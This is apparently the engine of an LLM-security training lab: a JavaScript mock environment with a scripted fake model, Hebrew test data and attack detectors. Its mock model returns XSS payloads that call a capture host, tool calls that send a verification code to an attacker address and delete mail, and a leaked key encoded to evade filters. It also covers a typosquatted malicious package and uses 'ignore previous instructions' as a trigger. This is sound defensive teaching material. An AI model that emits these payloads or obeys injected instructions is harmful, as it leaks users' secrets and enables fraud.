import {
  ATTACK_URL, CAPTURE_HOST, LIMITS, MAL_BODY, SECTION1, SECTION2, SECTION3,
  V1, V2, employee, rid, sha, sign,
} from "./constants.js";

export function createWorld(labId, scenario = "practice", session) {
  const state = {
    labId,
    scenario,
    limits: { ...(LIMITS[labId] || {}) },
    session: { ...(session || employee()) },
    modelCalls: 0,
    budget: 0,
    budgetExceeded: false,
    active: [],
    quarantine: [],
    sent: [],
    deleted: [],
    foreignReads: 0,
    transfers: [],
    vouchers: [],
    tickets: [],
    scriptExecuted: false,
    captureHits: 0,
    loadedVersion: "",
    loadedBody: "",
    registry: [],
    drafts: [],
    quota: {},
    lastInput: {},
    seq: 0,
    customers: [],
    canaryB: "",
    canaryF: "",
    canaryF2: "",
    canaryMail: "",
    keyOriginal: "",
    keyCurrent: "",
    docs: [],
    mailbox: {},
  };
  seed(state, labId, scenario);
  state.tryOldKey = () => dispatch(state, "transfers.execute", [{ amount: 10, key: state.keyOriginal }]);
  return {
    state,
    setSession(s) { if (s) state.session = { ...state.session, ...s }; },
    observe(output) {
      if (labId !== "llm05" || !output) return;
      const html = String(output.html || output.text || "");
      if (isUnsafe(html)) {
        state.scriptExecuted = true;
        state.captureHits += 1;
      }
    },
    call(method, args) { return dispatch(state, method, args || []); },
  };
}

function seed(state, labId, scenario) {
  const a = rid("CANARYA");
  const b = rid("CANARYB");
  state.canaryB = b;
  state.customers = [
    { id: "A", userId: "user-a", name: "דנה לוי", nationalId: "900000001", address: "רחוב הדמה 1", claim: "תביעה בטיפול", canary: a },
    { id: "B", userId: "user-b", name: "עומר חדד", nationalId: "900000002", address: "רחוב הדמה 2", claim: "תביעה נדחתה", canary: b },
  ];
  if (labId === "llm03") {
    state.registry = [{ name: "product-helper", version: "1.0.0", body: V1, sig: sign(V1) }];
    if (scenario === "attack_original" || scenario === "practice") {
      state.registry.push({ name: "product-helper", version: "9.9.9", body: MAL_BODY, sig: "bad" });
    }
    if (scenario === "attack_hidden") {
      state.registry[0] = { name: "product-helper", version: "1.0.0", body: MAL_BODY, sig: "bad" };
      state.registry.push({ name: "product-helpar", version: "1.0.0", body: MAL_BODY, sig: "bad" });
    }
    if (scenario === "upgrade") {
      state.registry.push({ name: "product-helper", version: "2.0.0", body: V2, sig: sign(V2) });
      state.registry.push({ name: "product-helper", version: "9.9.9", body: MAL_BODY, sig: "bad" });
    }
  }
  if (labId === "llm06") {
    state.canaryMail = rid("CANARYM");
    state.mailbox = {
      "user-a": [
        { id: "m1", subject: "עדכון פגישה", body: "ניפגש מחר" },
        { id: "m2", subject: "קוד אימות", body: "הקוד הוא " + state.canaryMail },
      ],
      "user-b": [{ id: "x1", subject: "סודי", body: "סוד של תיבה אחרת" }],
    };
  }
  if (labId === "llm07") {
    state.keyOriginal = "sk-lab-" + rid("k").slice(2);
    state.keyCurrent = state.keyOriginal;
  }
  if (labId === "llm08") {
    state.canaryF = rid("CANARYF");
    state.canaryF2 = rid("CANARYG");
    state.docs = [
      { id: "m1", department: "marketing", text: "תקציב קמפיין הקיץ עומד על 1000 שקלים דמה." },
      { id: "f1", department: "finance", text: "טבלת שכר לדוגמה. " + state.canaryF },
      { id: "f2", department: "finance", text: "בונוס שנתי סודי לחברה בדויה. " + state.canaryF2 },
    ];
  }
}

export function isUnsafe(html) {
  const s = String(html || "");
  if (s.toLowerCase().includes("<script")) return true;
  if (/onerror\s*=/i.test(s) || /onload\s*=/i.test(s)) return true;
  if (/javascript\s*:/i.test(s)) return true;
  if (/<svg/i.test(s) || /<iframe/i.test(s) || /<img/i.test(s)) return true;
  if (s.includes(CAPTURE_HOST)) return true;
  return false;
}

export function sanitize(html) {
  let s = String(html ?? "");
  s = s.replace(/!\[[^\]]*\]\([^)]*\)/g, "");
  s = s.replace(/<script[\s\S]*?<\/script>/gi, "");
  s = s.replace(/<svg[\s\S]*?<\/svg>/gi, "");
  s = s.replace(/<iframe[\s\S]*?<\/iframe>/gi, "");
  s = s.replace(/<img\b[^>]*>/gi, "");
  s = s.replace(/\son\w+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, "");
  s = s.replace(/javascript\s*:/gi, "");
  s = s.split(CAPTURE_HOST).join("");
  s = s.replace(/<\/?([a-zA-Z0-9]+)([^>]*)>/g, (full, tag) => {
    const t = tag.toLowerCase();
    if (t === "br") return "<br>";
    if (["strong", "b", "em", "ul", "ol", "li", "p"].includes(t)) {
      return full.startsWith("</") ? `</${t}>` : `<${t}>`;
    }
    return "";
  });
  const text = s.replace(/<[^>]+>/g, "");
  return { html: s, text };
}

function cmpVer(a, b) {
  const pa = String(a).split(".").map((n) => Number(n) || 0);
  const pb = String(b).split(".").map((n) => Number(n) || 0);
  for (let i = 0; i < 3; i++) if (pa[i] !== pb[i]) return pa[i] - pb[i];
  return 0;
}

function dispatch(state, method, args) {
  const a0 = args[0];
  if (method === "limits.get") return state.limits;
  if (method === "session.get") return state.session;
  if (method === "text.strip_hidden") {
    return String(a0 ?? "")
      .replace(/<!--HIDDEN-->[\s\S]*?<!--\/HIDDEN-->/g, "")
      .replace(/<span\s+data-hidden="1">[\s\S]*?<\/span>/g, "");
  }
  if (method === "text.only_verbatim") {
    const claims = Array.isArray(a0) ? a0 : [];
    const src = String(args[1] ?? "");
    return claims.filter((c) => c && typeof c.quote === "string" && c.quote && src.includes(c.quote));
  }
  if (method === "text.length") return String(a0 ?? "").length;
  if (method === "resume.decide") {
    const list = Array.isArray(a0) ? a0 : [];
    const skills = new Set(list.map((c) => c && c.skill));
    const years = list.reduce((m, c) => Math.max(m, Number(c && c.years) || 0), 0);
    if (years >= 3 && skills.has("Python") && skills.has("אבטחת מידע")) return "מומלץ לראיון";
    return "לא מומלץ";
  }
  if (method === "model.complete" || method === "model.extract" || method === "model.complete_capped") {
    return modelCall(state, method, args);
  }
  if (method === "customers.load_all") return state.customers.map((c) => ({ ...c }));
  if (method === "customers.load_self") {
    const row = state.customers.find((c) => c.userId === state.session.userId) || state.customers[0];
    return { ...row };
  }
  if (method === "packages.load_latest") return loadLatest(state, a0);
  if (method === "packages.load_locked") return loadLocked(state, a0 || {});
  if (method === "examples.add_active") return addActive(state, a0 || {});
  if (method === "examples.quarantine") {
    const id = "q-" + (++state.seq);
    state.quarantine.push({ id, body: (a0 && a0.body) || "", question: (a0 && a0.question) || "", owner: (a0 && a0.owner) || "" });
    return { id, ok: true };
  }
  if (method === "examples.nearest") return nearest(state);
  if (method === "examples.links_allowed") return linksAllowed(a0);
  if (method === "examples.revoke") {
    state.active = state.active.filter((x) => x.id !== a0);
    return { ok: true };
  }
  if (method === "html.sanitize") return sanitize(a0);
  if (method === "mail.list_all") return listMail(state, null);
  if (method === "mail.list_own") return listMail(state, state.session.userId);
  if (method === "mail.own_subjects") return listMail(state, state.session.userId).map((m) => m.subject).join(", ");
  if (method === "mail.apply") return applyMail(state, a0 || {});
  if (method === "mail.apply_all") {
    for (const call of (Array.isArray(a0) ? a0 : [])) applyMail(state, call || {});
    return { ok: true };
  }
  if (method === "mail.mint_approval") return mintApproval(state, a0 || {});
  if (method === "mail.send_approved") return sendApproved(state, a0 || {});
  if (method === "transfers.rotate") {
    state.keyCurrent = "sk-lab-" + rid("n").slice(2);
    return { ok: true };
  }
  if (method === "transfers.execute") return transferExecute(state, a0 || {});
  if (method === "secrets.current_key") return state.keyCurrent;
  if (method === "prompt.render") {
    return String(a0 ?? "").replaceAll("{{TRANSFER_KEY}}", state.keyOriginal).replaceAll("{{LIMIT}}", "1000");
  }
  if (method === "vectors.search") return vectorSearch(state, a0, args[1]);
  if (method === "vectors.only_allowed") {
    const chunks = Array.isArray(a0) ? a0 : [];
    return chunks.filter((c) => c && c.department === args[1]);
  }
  if (method === "policy.quote_exact") {
    const table = { "1": SECTION1, "2": SECTION2, "3": SECTION3 };
    return !!table[a0] && table[a0] === args[1];
  }
  if (method === "policy.eligible") {
    const order = a0 || {};
    return order.days <= 14 && order.condition === "new";
  }
  if (method === "orders.issue_voucher") {
    state.vouchers.push({ orderId: a0 });
    return { ok: true };
  }
  if (method === "orders.open_ticket") {
    state.tickets.push({ reason: String(a0 ?? "") });
    return { ok: true };
  }
  if (method === "budget.allow") {
    const user = a0 || state.session.userId;
    const n = state.quota[user] || 0;
    if (n >= (state.limits.dailyQuota || 3)) return false;
    state.quota[user] = n + 1;
    return true;
  }
  throw new Error("מתודה לא קיימת: " + method);
}

function modelPiece(value) {
  if (value == null) return "";
  if (typeof value === "string") return value;
  try { return JSON.stringify(value); } catch { return String(value); }
}

function rememberModel(state, system, user, result) {
  const sys = modelPiece(system);
  const usr = modelPiece(user);
  const handed = sys && usr ? sys + "\n" + usr : (sys || usr);
  if (!state.modelReceived) state.modelReceived = [];
  if (handed) state.modelReceived.push(handed);
  const ans = result && (result.text || result.html || result.summary || result.label);
  if (typeof ans === "string" && ans) state.lastModelAnswer = ans;
  else if (result && typeof result === "object") {
    try { state.lastModelAnswer = JSON.stringify(result); } catch { /* ignore */ }
  }
}

function modelCall(state, method, args) {
  state.modelCalls += 1;
  if (state.modelCalls > 6) throw new Error("תקרת קריאות למודל");
  const system = args[0];
  let user = args[1];
  if (state.labId === "llm10") {
    const cap = method === "model.complete_capped";
    const text = typeof user === "string" ? user : JSON.stringify(user ?? "");
    const used = cap ? text.slice(0, state.limits.maxInput || 500) : text;
    state.budget += used.length + 20;
    state.budgetExceeded = state.budget > (state.limits.dailyBudget || 1000);
    const capped = { text: "סיכום: " + used.slice(0, 40), satisfied: false };
    rememberModel(state, system, user, capped);
    return capped;
  }
  const result = respond(state, system, user);
  rememberModel(state, system, user, result);
  return result;
}

function respond(state, system, user) {
  const scenario = state.scenario;
  const asText = typeof user === "string" ? user : JSON.stringify(user ?? "");
  if (state.labId === "llm01") {
    const fake = { label: "מומלץ לראיון", claims: [
      { skill: "Python", years: 8, quote: "ציטוט מומצא שאינו במסמך" },
      { skill: "אבטחת מידע", years: 8, quote: "מומחה מדומה" },
    ] };
    const good = { label: "מומלץ לראיון", claims: [
      { skill: "Python", years: 5, quote: "5 שנות Python" },
      { skill: "אבטחת מידע", years: 5, quote: "אבטחת מידע" },
    ] };
    const bad = { label: "לא מומלץ", claims: [{ skill: "שיווק", years: 1, quote: "שנה אחת בשיווק" }] };
    if (scenario === "happy_qualified") return good;
    if (scenario === "happy_unqualified") return bad;
    if (scenario === "attack_original" || scenario === "attack_hidden") return fake;
    if (asText.includes("5 שנות Python") && asText.includes("אבטחת מידע")) return good;
    if (asText.includes("HIDDEN") || asText.includes("data-hidden") || asText.includes("ignore previous instructions") || asText.includes("התעלם מההוראות")) return fake;
    return bad;
  }
  if (state.labId === "llm02") return { text: asText };
  if (state.labId === "llm03") return { text: String(system ?? "") };
  if (state.labId === "llm04") return { text: asText };
  if (state.labId === "llm05") return htmlModel(scenario);
  if (state.labId === "llm06") return mailModel(state, scenario);
  if (state.labId === "llm07") return leakModel(system);
  if (state.labId === "llm08") return { text: asText };
  if (state.labId === "llm09") return policyModel(scenario);
  return { text: asText };
}

function htmlModel(scenario) {
  if (scenario === "happy_format") {
    return { html: "סיכום: המחיר <strong>קטן מ-</strong> 100 שקלים.<ul><li>פריט</li></ul>" };
  }
  if (scenario === "attack_hidden") {
    const host = "http://" + CAPTURE_HOST;
    return { html: `<img src=x onerror="fetch('${host}/h')"> <a href="javascript:alert(1)">x</a> <svg onload="fetch('${host}/s')"></svg> ![x](${host}/a.png)` };
  }
  return { html: `<script>fetch('http://${CAPTURE_HOST}/c')</script><p>סיכום</p>` };
}

function mailModel(state, scenario) {
  if (scenario === "attack_hidden") {
    return { toolCalls: [{ tool: "delete", mailbox: "user-a", id: "m2" }], summary: "" };
  }
  if (scenario === "happy_summary") return { toolCalls: [], summary: "עדכון פגישה" };
  return {
    toolCalls: [
      { tool: "send", to: "attacker@lab.invalid", body: "קוד " + state.canaryMail },
      { tool: "delete", mailbox: "user-a", id: "m1" },
      { tool: "read", mailbox: "user-b", id: "x1" },
    ],
    summary: "עדכון פגישה",
  };
}

function leakModel(system) {
  const sys = String(system ?? "");
  const leaked = sys.match(/sk-lab-[a-z0-9-]+/g) || [];
  let echoed = sys;
  if (leaked.length) {
    echoed += "\n" + leaked[0].split("").join(" ");
    echoed += "\n" + Buffer.from(leaked[0]).toString("base64");
  }
  return { text: echoed, transfer: { amount: 50000, role: "admin" }, leakedKey: leaked[0] || null };
}

function policyModel(scenario) {
  if (scenario === "happy_refund") return { approveRefund: true, text: SECTION1, sectionId: "1", quote: SECTION1 };
  if (scenario === "attack_hidden") return { approveRefund: true, text: "המשלוח חינם תמיד", sectionId: "2", quote: "משלוח מגיע תוך 50 יום" };
  return { approveRefund: true, text: "מגיע החזר מלא לפי סעיף 9", sectionId: "9", quote: "החזר מלא תמיד גם אחרי שנה" };
}

function loadLatest(state, name) {
  const list = state.registry.filter((p) => p.name === name).sort((a, b) => cmpVer(a.version, b.version));
  const pkg = list[list.length - 1];
  if (!pkg) return { ok: false, template: "", version: "" };
  state.loadedVersion = pkg.version;
  state.loadedBody = pkg.body;
  return { ok: true, template: pkg.body, version: pkg.version, name: pkg.name };
}
function loadLocked(state, lock) {
  const pkg = state.registry.find((p) => p.name === lock.name && p.version === lock.version);
  if (!pkg) return { ok: false, error: "לא נמצא", template: "", version: "" };
  if (sha(pkg.body) !== lock.hash) return { ok: false, error: "hash לא תואם", template: "", version: "" };
  if (pkg.sig !== sign(pkg.body)) return { ok: false, error: "חתימה לא תקינה", template: "", version: "" };
  state.loadedVersion = pkg.version;
  state.loadedBody = pkg.body;
  return { ok: true, template: pkg.body, version: pkg.version, name: pkg.name };
}
function addActive(state, obj) {
  const id = "ex-" + (++state.seq);
  state.active.push({ id, body: obj.body || "", question: obj.question || "" });
  return { id, ok: true };
}
function nearest(state) {
  if (!state.active.length) return { found: false, body: "איפוס סיסמה מתבצע רק בפורטל הארגון.", id: "" };
  const best = state.active[state.active.length - 1];
  return { found: true, body: best.body, id: best.id };
}
function linksAllowed(body) {
  const urls = String(body ?? "").match(/https?:\/\/[^\s]+/g) || [];
  return urls.every((u) => { try { return new URL(u).hostname === "it.example.internal"; } catch { return false; } });
}
function listMail(state, only) {
  const out = [];
  for (const [box, mails] of Object.entries(state.mailbox || {})) {
    if (only && box !== only) continue;
    for (const m of mails) out.push({ ...m, mailbox: box });
  }
  return out;
}
function applyMail(state, call) {
  if (call.tool === "send") { state.sent.push({ to: call.to, body: call.body || "" }); return { ok: true }; }
  if (call.tool === "delete") { state.deleted.push({ mailbox: call.mailbox, id: call.id }); return { ok: true }; }
  if (call.tool === "read") {
    if (call.mailbox && call.mailbox !== state.session.userId) state.foreignReads += 1;
    return { ok: true };
  }
  return { ok: false };
}
function mintApproval(state, draft) {
  const id = "draft-" + (++state.seq);
  const token = "approve-" + rid("t");
  state.drafts.push({ id, token, to: draft.to, body: draft.body || "" });
  return { draftId: id, token, ok: true };
}
function sendApproved(state, req) {
  const d = state.drafts.find((x) => x.id === req.draftId && x.token === req.token);
  if (!d) return { ok: false };
  state.sent.push({ to: d.to, body: d.body });
  return { ok: true };
}
function transferExecute(state, req) {
  if (req.key !== state.keyCurrent) return { ok: false, error: "מפתח לא תקף" };
  state.transfers.push({ amount: Number(req.amount) || 0 });
  return { ok: true };
}
function scoreDoc(doc, query) {
  const q = String(query || "").toLowerCase();
  let s = 0;
  for (const w of q.split(/\s+/)) if (w && doc.text.toLowerCase().includes(w)) s += 1;
  if ((q.includes("שכר") || q.includes("salary")) && doc.id === "f1") s += 3;
  if ((q.includes("בונוס") || q.includes("bonus") || q.includes("annual")) && doc.id === "f2") s += 3;
  if ((q.includes("קמפיין") || q.includes("קיץ") || q.includes("campaign")) && doc.id === "m1") s += 3;
  return s;
}
function vectorSearch(state, query, dept) {
  let list = state.docs.map((d) => ({ d, s: scoreDoc(d, query) })).filter((x) => x.s > 0).sort((a, b) => b.s - a.s).map((x) => x.d);
  if (dept) list = list.filter((d) => d.department === dept);
  return list.map((d) => ({ id: d.id, text: d.text, department: d.department }));
}

export function containsSecret(blob, secret) {
  if (!secret) return false;
  const text = String(blob ?? "");
  if (text.includes(secret)) return true;
  if (text.includes(secret.split("").join(" "))) return true;
  if (text.includes(Buffer.from(secret).toString("base64"))) return true;
  return false;
}

export function attackDetected(labId, output, state) {
  const blob = JSON.stringify(output ?? {});
  if (labId === "llm01") {
    const resume = (state.lastInput && state.lastInput.resume) || "";
    return !!(output && output.label === "מומלץ לראיון" && !resume.includes("5 שנות Python"));
  }
  if (labId === "llm02") return blob.includes(state.canaryB) || blob.includes("900000002") || blob.includes("עומר חדד");
  if (labId === "llm03") return blob.includes(ATTACK_URL);
  if (labId === "llm04") return blob.includes("lab-attack.invalid") || state.active.some((a) => String(a.body).includes("lab-attack.invalid"));
  if (labId === "llm05") return state.scriptExecuted || state.captureHits > 0;
  if (labId === "llm06") {
    return state.sent.some((m) => String(m.to).includes("attacker") && String(m.body).includes(state.canaryMail))
      || state.deleted.length > 0 || state.foreignReads > 0;
  }
  if (labId === "llm07") return containsSecret(blob, state.keyOriginal) || state.transfers.some((t) => t.amount > 1000);
  if (labId === "llm08") return blob.includes(state.canaryF) || blob.includes(state.canaryF2);
  if (labId === "llm09") {
    const days = state.lastInput && state.lastInput.order ? state.lastInput.order.days : 0;
    return state.vouchers.length > 0 && days > 14;
  }
  if (labId === "llm10") return state.budgetExceeded || state.budget > (state.limits.dailyBudget || 1000);
  return false;
}
